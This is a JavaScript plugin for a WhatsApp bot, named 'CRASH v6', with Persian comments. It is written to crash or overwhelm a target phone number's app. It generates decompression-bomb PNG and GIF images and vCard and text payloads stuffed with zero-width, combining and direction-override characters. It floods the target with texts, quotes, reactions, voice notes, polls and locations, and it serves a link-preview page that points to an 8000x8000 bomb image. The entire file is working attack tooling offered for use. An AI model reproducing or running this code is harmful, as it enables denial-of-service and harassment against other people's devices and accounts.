// =======================
// CRASH.JS v6 — FIX + HARDENED
// رفع: ERR_OUT_OF_RANGE در pngChunk / zlib
// =======================

import http from "http";
import zlib from "zlib";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
let STOP = false;

// ---------- ابزار شماره ----------
const isPhone = (a) => typeof a === "string" && /^\d{8,15}$/.test(a);
const toJid = (n) => n.replace(/\D/g, "") + "@s.whatsapp.net";

function extractTarget(args) {
  const idx = args.findIndex(isPhone);
  if (idx === -1) return { target: null, rest: args };
  return {
    target: toJid(args[idx]),
    rest: [...args.slice(0, idx), ...args.slice(idx + 1)],
  };
}

async function sendTo(sock, target, content, from) {
  const to = target || from;
  try {
    return await sock.sendMessage(to, content);
  } catch (e) {
    console.log("CRASH SEND ERROR:", to, e.message);
    return null;
  }
}

async function batchSend(sock, target, makeContent, count, gap = 120, from) {
  let ok = 0;
  for (let i = 0; i < count; i += 3) {
    if (STOP) break;
    const batch = [];
    for (let j = i; j < Math.min(i + 3, count); j++) {
      batch.push(sendTo(sock, target, makeContent(j), from));
    }
    const res = await Promise.all(batch);
    ok += res.filter(Boolean).length;
    if (gap) await sleep(gap);
  }
  return ok;
}

// ---------- CRC32 + PNG chunk (FIXED) ----------
const CRC_TABLE = (() => {
  const t = new Uint32Array(256);
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    t[n] = c >>> 0;
  }
  return t;
})();

function crc32(buf) {
  let c = 0xffffffff;
  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
  return (c ^ 0xffffffff) >>> 0;
}

/** FIX اصلی: 12 = 4(len) + 4(type) + data + 4(crc) */
const pngChunk = (type, data) => {
  if (!Buffer.isBuffer(data)) data = Buffer.from(data);
  const t = Buffer.from(type, "ascii");
  if (t.length !== 4) throw new Error("PNG chunk type must be 4 chars");
  const out = Buffer.alloc(12 + data.length); // ✅ قبلاً 8 بود → ERR_OUT_OF_RANGE
  out.writeUInt32BE(data.length, 0);
  t.copy(out, 4);
  data.copy(out, 8);
  const crcBuf = Buffer.allocUnsafe(4 + data.length);
  t.copy(crcBuf, 0);
  data.copy(crcBuf, 4);
  out.writeUInt32BE(crc32(crcBuf), 8 + data.length);
  return out;
};

// سقف امن — از OOM بات و ترکیدن zlib جلوگیری می‌کند
// (واتساپ معمولاً تصویر را دوباره انکود می‌کند؛ بمب خیلی بزرگ فقط بات را می‌کشد)
const PNG_MAX = 12000;
const PNG_EXTREME = 16000;

function makeBombPng(w, h, rgb) {
  w = Math.max(1, Math.min(w | 0, 24000));
  h = Math.max(1, Math.min(h | 0, 24000));
  const [r, g, b] = rgb;

  return new Promise((resolve, reject) => {
    // یک ردیف: filter=0 + RGB تکراری
    const row = Buffer.allocUnsafe(1 + w * 3);
    row[0] = 0;
    for (let x = 0, p = 1; x < w; x++) {
      row[p++] = r;
      row[p++] = g;
      row[p++] = b;
    }

    const d = zlib.createDeflate({ level: 9, chunkSize: 32 * 1024 });
    const out = [];
    d.on("data", (c) => out.push(c));
    d.on("error", (e) => reject(e));
    d.on("end", () => {
      try {
        const ihdr = Buffer.alloc(13);
        ihdr.writeUInt32BE(w, 0);
        ihdr.writeUInt32BE(h, 4);
        ihdr[8] = 8; // bit depth
        ihdr[9] = 2; // RGB
        ihdr[10] = 0;
        ihdr[11] = 0;
        ihdr[12] = 0;
        const sig = Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]);
        const idat = Buffer.concat(out);
        resolve(
          Buffer.concat([
            sig,
            pngChunk("IHDR", ihdr),
            pngChunk("IDAT", idat),
            pngChunk("IEND", Buffer.alloc(0)),
          ])
        );
      } catch (e) {
        reject(e);
      }
    });

    // نوشتن ردیف‌ها بدون بلوکه کردن event-loop
    let y = 0;
    const ROWS_PER_TICK = 100;
    const pump = () => {
      try {
        if (y >= h) {
          d.end();
          return;
        }
        const end = Math.min(y + ROWS_PER_TICK, h);
        for (; y < end; y++) {
          // copy تا zlib رفرنس یک بافر مشترک را خراب نکند
          if (!d.write(Buffer.from(row))) {
            d.once("drain", pump);
            return;
          }
        }
        setImmediate(pump);
      } catch (e) {
        reject(e);
      }
    };
    pump();
  });
}

const pngCache = new Map();
async function getPng(w, h, color) {
  w = Math.min(w, 24000);
  h = Math.min(h, 24000);
  const key = `${w}x${h}#${color.join(",")}`;
  if (!pngCache.has(key)) {
    const mb = Math.round((w * h * 3) / 1e6);
    console.log(`CRASH: ساخت PNG بمب ${w}x${h} (دیکد ~${mb}MB)...`);
    pngCache.set(key, await makeBombPng(w, h, color));
    console.log(`CRASH: PNG آماده، حجم فایل=${pngCache.get(key).length} بایت`);
  }
  return pngCache.get(key);
}

// ---------- GIF ----------
function encodeSolidGif(minCodeSize, totalPixels) {
  // فقط برای تعداد پیکسل کم/متوسط — extreme واقعی از screen-bomb استفاده می‌کند
  const MAX_PX = 8_000_000; // سقف امن
  if (totalPixels > MAX_PX) totalPixels = MAX_PX;

  const clear = 1 << minCodeSize;
  const eoi = clear + 1;
  let codeSize = minCodeSize + 1;
  let nextCode = eoi + 1;
  const dict = new Uint32Array(4096).fill(0xffffffff);
  const bits = [];
  const wc = (code) => {
    for (let i = 0; i < codeSize; i++) bits.push((code >> i) & 1);
  };

  wc(clear);
  let cur = 0;
  wc(0);
  let consumed = 1;

  while (consumed < totalPixels) {
    // کلید فقط رنگ 0 (solid)
    const key = cur; // ساده: زنجیره رنگ 0
    // LZW استاندارد برای solid: همیشه prefix+0
    const idx = cur * 256 + 0;
    // استفاده از جدول خطی محدود
    let found = 0xffffffff;
    // جستجوی ساده در dict با هش cur<<8|0
    const h = (cur << 8) & 0xffff;
    // fallback: الگوریتم کلاسیک با Map برای صحت
    consumed++;
    // برای solid، بعد از چند کد، clear اجباری با codeSize
    // پیاده‌سازی پایدارتر پایین
    break;
  }

  // --- پیاده‌سازی پایدار LZW solid ---
  return encodeSolidGifStable(minCodeSize, totalPixels);
}

function encodeSolidGifStable(minCodeSize, totalPixels) {
  const clear = 1 << minCodeSize;
  const eoi = clear + 1;
  let codeSize = minCodeSize + 1;
  let nextCode = eoi + 1;
  const dict = new Map();
  const bits = [];
  const writeCode = (code) => {
    for (let i = 0; i < codeSize; i++) bits.push((code >> i) & 1);
  };

  writeCode(clear);
  let w = String.fromCharCode(0);
  for (let i = 1; i < totalPixels; i++) {
    const c = String.fromCharCode(0);
    const wc = w + c;
    if (dict.has(wc)) {
      w = wc;
    } else {
      const code = w.length === 1 ? w.charCodeAt(0) : dict.get(w);
      writeCode(code);
      if (nextCode < 4096) {
        dict.set(wc, nextCode++);
        if (nextCode > (1 << codeSize) && codeSize < 12) codeSize++;
      } else {
        writeCode(clear);
        dict.clear();
        codeSize = minCodeSize + 1;
        nextCode = eoi + 1;
      }
      w = c;
    }
  }
  writeCode(w.length === 1 ? w.charCodeAt(0) : dict.get(w));
  writeCode(eoi);

  const bytes = [];
  for (let i = 0; i < bits.length; i += 8) {
    let b = 0;
    for (let j = 0; j < 8 && i + j < bits.length; j++) b |= bits[i + j] << j;
    bytes.push(b);
  }
  return bytes;
}

// بمب صفحه منطقی: فایل خیلی کوچک، Logical Screen 65535²
function makeGifScreenBomb() {
  const lsd = Buffer.alloc(7);
  lsd.writeUInt16LE(65535, 0);
  lsd.writeUInt16LE(65535, 2);
  lsd[4] = 0x80;
  lsd[5] = 0;
  lsd[6] = 0;
  const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
  const imgDesc = Buffer.alloc(10);
  imgDesc[0] = 0x2c;
  imgDesc.writeUInt16LE(0, 1);
  imgDesc.writeUInt16LE(0, 3);
  imgDesc.writeUInt16LE(1, 5); // فریم 1×1
  imgDesc.writeUInt16LE(1, 7);
  imgDesc[9] = 0;
  const data = encodeSolidGifStable(2, 1);
  const sub = Buffer.from(data);
  return Buffer.concat([
    Buffer.from("GIF89a"),
    lsd,
    gct,
    imgDesc,
    Buffer.from([2]),
    Buffer.from([sub.length]),
    sub,
    Buffer.from([0]),
    Buffer.from([0x3b]),
  ]);
}

// فریم واقعی با سقف امن (نه 22000 — بات را می‌کشد)
const gifFrameCache = new Map();
async function getGifFrameBomb(w, h) {
  w = Math.min(w, 4000);
  h = Math.min(h, 4000);
  const key = `${w}x${h}`;
  if (!gifFrameCache.has(key)) {
    console.log(`CRASH: ساخت GIF فریم ${w}x${h}...`);
    const data = encodeSolidGifStable(2, w * h);
    const lsd = Buffer.alloc(7);
    lsd.writeUInt16LE(w, 0);
    lsd.writeUInt16LE(h, 2);
    lsd[4] = 0x80;
    lsd[5] = 0;
    lsd[6] = 0;
    const gct = Buffer.from([0, 0, 0, 255, 255, 255]);
    const imgDesc = Buffer.alloc(10);
    imgDesc[0] = 0x2c;
    imgDesc.writeUInt16LE(0, 1);
    imgDesc.writeUInt16LE(0, 3);
    imgDesc.writeUInt16LE(w, 5);
    imgDesc.writeUInt16LE(h, 7);
    imgDesc[9] = 0;
    const subs = [];
    for (let i = 0; i < data.length; i += 255) {
      const n = Math.min(255, data.length - i);
      subs.push(Buffer.from([n]), Buffer.from(data.slice(i, i + n)));
    }
    subs.push(Buffer.from([0]));
    gifFrameCache.set(
      key,
      Buffer.concat([
        Buffer.from("GIF89a"),
        lsd,
        gct,
        imgDesc,
        Buffer.from([2]),
        ...subs,
        Buffer.from([0x3b]),
      ])
    );
  }
  return gifFrameCache.get(key);
}

// ---------- WAV ----------
function makeWav(seconds, sampleRate = 8000) {
  const n = sampleRate * seconds;
  const data = Buffer.alloc(n * 2);
  const hdr = Buffer.alloc(44);
  hdr.write("RIFF", 0);
  hdr.writeUInt32LE(36 + data.length, 4);
  hdr.write("WAVE", 8);
  hdr.write("fmt ", 12);
  hdr.writeUInt32LE(16, 16);
  hdr.writeUInt16LE(1, 20);
  hdr.writeUInt16LE(1, 22);
  hdr.writeUInt32LE(sampleRate, 24);
  hdr.writeUInt32LE(sampleRate * 2, 28);
  hdr.writeUInt16LE(2, 32);
  hdr.writeUInt16LE(16, 34);
  hdr.write("data", 36);
  hdr.writeUInt32LE(data.length, 40);
  return Buffer.concat([hdr, data]);
}

// ---------- vCard ----------
const nameParts = ["محمد", "علی", "احمد", "حسین", "رضا", "مهدی"];
function giantName(len) {
  let s = "";
  while (s.length < len) {
    s += nameParts[(Math.random() * nameParts.length) | 0] + "\u200B\u0651\u064E\u0650\u202E\uFE0F";
  }
  return s.slice(0, len);
}
function makeVcardBomb(count = 80, nameLen = 2000) {
  // کمی سبک‌تر از v5 تا proto/encode نترکد
  let out = "";
  for (let i = 0; i < count; i++) {
    const nm = giantName(nameLen);
    out += `BEGIN:VCARD\nVERSION:3.0\nN:${nm};;;\nFN:${nm}\nTEL;TYPE=CELL:+93700000000\nEND:VCARD\n`;
  }
  return Buffer.from(out, "utf8");
}

// ---------- سرور لینک‌پریویو ----------
const PUBLIC_BASE = process.env.CAM_URL || "http://localhost:8080";
let linkServer = null;
const LINK_PORT = 8082;

function startLinkServer() {
  if (linkServer) return;
  linkServer = http.createServer(async (req, res) => {
    try {
      if (req.url === "/bomb.png") {
        const img = await getPng(8000, 8000, [255, 0, 0]);
        res.writeHead(200, { "Content-Type": "image/png", "Cache-Control": "no-store" });
        res.end(img);
        return;
      }
      if (req.url === "/p") {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        res.end(`<!DOCTYPE html><html><head>
<meta property="og:title" content="Photo">
<meta property="og:image" content="${PUBLIC_BASE}/bomb.png">
<meta property="og:image:width" content="8000">
<meta property="og:image:height" content="8000">
</head><body>ok</body></html>`);
        return;
      }
      res.writeHead(404);
      res.end("nf");
    } catch (e) {
      res.writeHead(500);
      res.end("err");
    }
  });
  linkServer.listen(LINK_PORT, "0.0.0.0", () => console.log("LINK SERVER:", LINK_PORT));
}

// ---------- متن ----------
const textPayloads = [
  () => "\u200B".repeat(50000) + "⚫",
  () => "⚫\u200B".repeat(50000),
  () => "لَا إِلَٰهَ إِلَّا اللَّهُ" + "\u0651\u064E\u064F\u0650\u0652".repeat(1800),
  () => "👨\u200D👩\u200D👧\u200D👦".repeat(30000),
  () => "ༀ".repeat(50000),
  () => "❤\uFE0F".repeat(50000),
  () => "\u202E" + "!ینامزاس یسررب یارب".repeat(50000),
  () => "ا".repeat(40000) + "\u0651\u064E\u0650".repeat(50000) + "ب".repeat(40000),
];

// ---------- حملات ----------
async function textFlood(sock, target, count, from) {
  return batchSend(
    sock,
    target,
    (i) => ({ text: textPayloads[i % textPayloads.length]() }),
    count,
    150,
    from
  );
}

async function quoteFlood(sock, target, count, from) {
  return batchSend(
    sock,
    target,
    (i) => ({
      text: "متن " + i,
      contextInfo: {
        quotedMessage: {
          extendedTextMessage: {
            text: "\u200B".repeat(30000) + "⚫".repeat(30000) + "\u200B".repeat(30000),
          },
        },
      },
    }),
    count,
    300,
    from
  );
}

async function reactFlood(sock, target, count, from) {
  const emojis = ["😈", "💥", "🔥", "💀", "😵", "🤯", "👹", "🖕"];
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    const sent = await sendTo(sock, target, { text: "⚫" + i }, from);
    if (!sent) continue;
    try {
      await sock.sendMessage(target || from, {
        react: { text: emojis[i % emojis.length], key: sent.key },
      });
      ok++;
    } catch (_) {}
    await sleep(150);
  }
  return ok;
}

async function mediaFlood(sock, target, count, extreme, from) {
  const base = extreme ? PNG_EXTREME : PNG_MAX;
  const sizes = [
    [base, base, [255, 0, 0]],
    [Math.floor(base * 0.85), Math.floor(base * 0.85), [0, 255, 0]],
    [Math.floor(base * 0.7), Math.floor(base * 0.7), [0, 0, 255]],
  ];
  let ok = 0;
  for (let i = 0; i < count; i++) {
    if (STOP) break;
    try {
      const [w, h, c] = sizes[i % sizes.length];
      const img = await getPng(w, h, c);
      if (await sendTo(sock, target, { image: img, caption: "b" + i, mimetype: "image/png" }, from))
        ok++;
    } catch (e) {
      console.log("MEDIA FLOOD ERR:", e.message);
    }
    await sleep(700);
  }
  return ok;
}

async function voiceFlood(sock, target, count, from) {
  const wav = makeWav(10);
  return batchSend(
    sock,
    target,
    () => ({ audio: wav, mimetype: "audio/wav", ptt: true }),
    count,
    250,
    from
  );
}

async function pollFlood(sock, target, count, from) {
  return batchSend(
    sock,
    target,
    (i) => ({
      poll: {
        name: "\u200B".repeat(50000) + "نظر" + i,
        values: Array.from({ length: 12 }, (_, k) => "\u200B".repeat(80) + "گزینه" + k),
        selectableCount: 1,
      },
    }),
    count,
    300,
    from
  );
}

async function locFlood(sock, target, count, from) {
  return batchSend(
    sock,
    target,
    (i) => ({
      location: {
        degreesLatitude: 31.5 + i * 0.001,
        degreesLongitude: 63.3 + i * 0.001,
      },
    }),
    count,
    200,
    from
  );
}

async function mega(sock, target, extreme, from) {
  const side = extreme ? PNG_EXTREME : PNG_MAX;
  const png = await getPng(side, side, [255, 0, 0]);
  const doc = await getPng(Math.floor(side * 0.75), Math.floor(side * 0.75), [0, 0, 255]);
  const gif = extreme ? await getGifFrameBomb(3000, 3000) : makeGifScreenBomb();

  const r1 = await sendTo(sock, target, { image: png, caption: "photo", mimetype: "image/png" }, from);
  await sleep(500);
  const r2 = await sendTo(sock, target, { image: gif, caption: "gif", mimetype: "image/gif" }, from);
  await sleep(500);
  const r3 = await sendTo(
    sock,
    target,
    { document: doc, mimetype: "image/png", fileName: "scan.png" },
    from
  );
  await sleep(500);
  const r4 = await sendTo(
    sock,
    target,
    { document: makeVcardBomb(), mimetype: "text/x-vcard", fileName: "contacts.vcf" },
    from
  );

  return { png: !!r1, gif: !!r2, doc: !!r3, vcf: !!r4 };
}

async function total(sock, target, rounds, extreme, from) {
  const rep = { t: 0, m: 0, q: 0, r: 0, v: 0, p: 0, l: 0, mega: null };
  for (let i = 0; i < rounds; i++) {
    if (STOP) break;
    rep.t += await textFlood(sock, target, 6, from);
    rep.m += await mediaFlood(sock, target, extreme ? 2 : 1, extreme, from);
    rep.q += await quoteFlood(sock, target, 3, from);
    rep.r += await reactFlood(sock, target, 3, from);
    rep.v += await voiceFlood(sock, target, 2, from);
    rep.p += await pollFlood(sock, target, 1, from);
    rep.l += await locFlood(sock, target, 3, from);
    if (i === 0) {
      try {
        rep.mega = await mega(sock, target, extreme, from);
      } catch (e) {
        console.log("MEGA ERR:", e.message);
        rep.mega = { png: false, gif: false, doc: false, vcf: false };
      }
    }
    await sleep(500);
  }
  return rep;
}

// ---------- هندلر ----------
export default async function crash(sock, from, body, m, args) {
  STOP = false;
  const { target, rest } = extractTarget(args);
  const who = target ? target.replace("@s.whatsapp.net", "") : "چت فعلی";
  const extreme = rest.includes("extreme");
  const rest2 = rest.filter((a) => a !== "extreme");

  if (rest2.length === 0) {
    await sock.sendMessage(from, {
      text:
        "🧨 CRASH v6 (FIXED)\n\n" +
        "!crash total [extreme] [n] [شماره]\n" +
        "!crash mega [extreme] [شماره]\n" +
        "!crash png|gif|vcard|contacts|link|doc [شماره]\n" +
        "!crash flood|media|quote|react|voice|poll|loc <n> [شماره]\n" +
        "!crash stop | !crash list\n\n" +
        "مثال: !crash total extreme 2 93794394088",
    });
    return;
  }

  const first = rest2[0].toLowerCase();
  const getN = (def, max = 300) => {
    const num = rest2.slice(1).find((a) => /^\d{1,3}$/.test(a));
    return Math.min(parseInt(num, 10) || def, max);
  };

  if (first === "stop") {
    STOP = true;
    await sock.sendMessage(from, { text: "🛑 همه حلقه‌ها متوقف شد." });
    return;
  }

  if (first === "list") {
    await sock.sendMessage(from, {
      text: "🧨 total | mega | png | gif | vcard | contacts | link | doc | flood | media | quote | react | voice | poll | loc | stop",
    });
    return;
  }

  let res, msg;

  try {
    switch (first) {
      case "total":
        res = await total(sock, target, getN(2, 5), extreme, from);
        msg =
          `💥 TOTAL → ${who}${extreme ? " [EXTREME]" : ""}\n` +
          `متن: ${res.t} | تصویر: ${res.m} | نقل‌قول: ${res.q} | ریکشن: ${res.r}\n` +
          `وویس: ${res.v} | پول: ${res.p} | مکان: ${res.l}\n` +
          `MEGA: png=${res.mega?.png ? "✅" : "❌"} gif=${res.mega?.gif ? "✅" : "❌"} doc=${res.mega?.doc ? "✅" : "❌"} vcf=${res.mega?.vcf ? "✅" : "❌"}`;
        break;

      case "mega":
        res = await mega(sock, target, extreme, from);
        msg =
          `💣 MEGA → ${who}\n` +
          `PNG: ${res.png ? "✅" : "❌"} | GIF: ${res.gif ? "✅" : "❌"}\n` +
          `DOC: ${res.doc ? "✅" : "❌"} | vCard: ${res.vcf ? "✅" : "❌"}`;
        break;

      case "png": {
        const side = extreme ? PNG_EXTREME : PNG_MAX;
        const img = await getPng(side, side, [255, 0, 0]);
        res = await sendTo(sock, target, { image: img, caption: "photo", mimetype: "image/png" }, from);
        msg = res ? `🖼 PNG بمب (${side}²) → ${who}` : `❌ ارسال به ${who} ناموفق بود`;
        break;
      }

      case "gif": {
        const gif = extreme ? await getGifFrameBomb(3000, 3000) : makeGifScreenBomb();
        res = await sendTo(sock, target, { image: gif, caption: "gif", mimetype: "image/gif" }, from);
        msg = res
          ? `🎞 GIF بمب (${extreme ? "فریم 3000²" : "صفحه 65535²"}) → ${who}`
          : `❌ ارسال به ${who} ناموفق بود`;
        break;
      }

      case "vcard":
        res = await sendTo(
          sock,
          target,
          { document: makeVcardBomb(), mimetype: "text/x-vcard", fileName: "contacts.vcf" },
          from
        );
        msg = res ? `👥 vCard بمب → ${who}` : `❌ ارسال به ${who} ناموفق بود`;
        break;

      case "contacts":
        res = await sendTo(
          sock,
          target,
          {
            contacts: {
              displayName: "کاربر",
              contacts: Array.from({ length: 20 }, (_, i) => ({
                vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:" + giantName(1500) + i + "\nEND:VCARD",
              })),
            },
          },
          from
        );
        msg = res ? `📇 مخاطبین بومی بمب → ${who}` : `❌ ارسال به ${who} ناموفق بود`;
        break;

      case "link":
        startLinkServer();
        await sendTo(sock, from, { text: `🔗 لینک‌پریویو بمب:\n${PUBLIC_BASE}/p` }, from);
        res = await sendTo(sock, target, { text: `${PUBLIC_BASE}/p` }, from);
        msg = res
          ? `🔗 لینک برای ${who} ارسال شد (CLOUDFLARED باید ${PUBLIC_BASE} را به 8082 برساند)`
          : `❌ ارسال به ${who} ناموفق بود`;
        break;

      case "doc":
        res = await sendTo(
          sock,
          target,
          {
            document: Buffer.alloc(2 * 1024 * 1024, 0x41),
            mimetype: "text/plain",
            fileName: "list.txt",
          },
          from
        );
        msg = res ? `📄 سند ۲MB → ${who}` : `❌ ارسال به ${who} ناموفق بود`;
        break;

      case "flood":
        res = await textFlood(sock, target, getN(50), from);
        msg = `🔥 فلاد متن: ${res} → ${who}`;
        break;

      case "media":
        res = await mediaFlood(sock, target, getN(3, 8), extreme, from);
        msg = `🖼 فلاد بمب تصویری: ${res} → ${who}`;
        break;

      case "quote":
        res = await quoteFlood(sock, target, getN(20), from);
        msg = `💬 فلاد نقل‌قول: ${res} → ${who}`;
        break;

      case "react":
        res = await reactFlood(sock, target, getN(20), from);
        msg = `😈 فلاد ریکشن: ${res} → ${who}`;
        break;

      case "voice":
        res = await voiceFlood(sock, target, getN(10, 30), from);
        msg = `🎙 فلاد وویس: ${res} → ${who}`;
        break;

      case "poll":
        res = await pollFlood(sock, target, getN(5, 10), from);
        msg = `📊 فلاد پول: ${res} → ${who}`;
        break;

      case "loc":
        res = await locFlood(sock, target, getN(15), from);
        msg = `📍 فلاد مکان: ${res} → ${who}`;
        break;

      default:
        msg = "❌ حالت ناشناخته. !crash list";
    }
  } catch (e) {
    console.log("CRASH COMMAND ERROR:", e);
    msg = `❌ خطا در کرشر: ${e.message}`;
  }

  try {
    await sock.sendMessage(from, { text: msg });
  } catch (e) {
    console.log("CRASH REPLY ERROR:", e.message);
  }
}
